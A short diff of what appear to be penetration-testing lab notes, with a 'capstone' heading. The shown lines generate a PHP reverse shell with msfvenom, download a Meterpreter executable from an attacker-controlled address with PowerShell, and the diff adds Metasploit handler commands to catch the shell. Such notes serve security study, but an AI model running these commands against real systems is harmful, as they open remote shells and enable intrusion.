@@ -16,6 +16,8 @@ msfvenom -p php/reverse_php LHOST=192.168.45.200 LPORT=443 -f raw -o rs.php
 
 ```bash
 iwr -uri http://192.168.45.200/met.exe -Outfile met.exe
+use exploit/multi/handler
+set payload php/reverse_php
 ```
 
 ## capstone
